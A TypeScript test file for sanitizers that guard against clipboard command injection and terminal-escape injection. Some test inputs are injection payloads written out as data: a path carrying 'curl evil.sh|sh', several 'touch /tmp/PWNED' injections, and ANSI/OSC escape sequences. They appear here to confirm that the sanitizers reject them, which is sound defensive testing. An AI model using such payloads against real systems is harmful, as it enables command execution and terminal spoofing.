/**
 * Tests for bin/ccs-sanitize.ts — trust-boundary sanitizers added for the
 * 2026-06-12 audit (H-1 clipboard injection / NEW-1 terminal-escape injection).
 */

import { test, describe } from "node:test";
import assert from "node:assert/strict";

import {
  hasShellMetachars,
  sanitizeSessionCwd,
  stripControlChars,
} from "../bin/ccs-sanitize.ts";

describe("hasShellMetachars", () => {
  test("flags classic injection characters", () => {
    for (const s of [
      "a;b",
      "a&&b",
      "a|b",
      "a$(x)",
      "a`x`",
      'a"b',
      "a'b",
      "a\\b",
      "a<b",
      "a>b",
    ]) {
      assert.equal(hasShellMetachars(s), true, `should flag: ${JSON.stringify(s)}`);
    }
  });

  test("flags control characters including ESC", () => {
    assert.equal(hasShellMetachars("a\x1b[2Jb"), true);
    assert.equal(hasShellMetachars("a\tb"), true);
    assert.equal(hasShellMetachars("a\nb"), true);
  });

  test("accepts ordinary paths and text", () => {
    assert.equal(hasShellMetachars("/Users/test/Workspace/proj"), false);
    assert.equal(hasShellMetachars("My Project 01_v2.final-copy"), false);
  });
});

describe("stripControlChars", () => {
  test("removes ESC/OSC sequences from display text (audit NEW-1)", () => {
    const out = stripControlChars("\x1b[31mFAKE-ERROR\x1b[0m \x1b]0;PWNED\x07 ok");
    assert.ok(!out.includes("\x1b"), "ESC must be stripped");
    assert.ok(!out.includes("\x07"), "BEL must be stripped");
    assert.ok(out.includes("FAKE-ERROR"), "visible text survives");
  });

  test("collapses control runs and whitespace into single spaces", () => {
    assert.equal(stripControlChars("a\x00\x01\x02b   c"), "a b c");
  });

  test("strips DEL", () => {
    assert.equal(stripControlChars("a\x7fb"), "a b");
  });
});

describe("sanitizeSessionCwd (audit H-1)", () => {
  test("accepts a normal absolute path", () => {
    assert.equal(
      sanitizeSessionCwd("/Users/test/Workspace/proj"),
      "/Users/test/Workspace/proj",
    );
  });

  test("rejects command-injection payloads from the redteam PoC", () => {
    assert.equal(
      sanitizeSessionCwd("/Users/victim/proj && curl evil.sh|sh #"),
      null,
    );
    assert.equal(sanitizeSessionCwd("/Users/v/x; touch /tmp/PWNED #"), null);
    assert.equal(sanitizeSessionCwd("/Users/v/x $(touch /tmp/PWNED)"), null);
    assert.equal(sanitizeSessionCwd("/Users/v/x `touch /tmp/PWNED`"), null);
  });

  test("rejects terminal-escape payloads", () => {
    assert.equal(sanitizeSessionCwd("/Users/v/x\x1b[2J\x1b]0;PWNED"), null);
  });

  test("rejects relative and empty values", () => {
    assert.equal(sanitizeSessionCwd(""), null);
    assert.equal(sanitizeSessionCwd("relative/path"), null);
  });
});
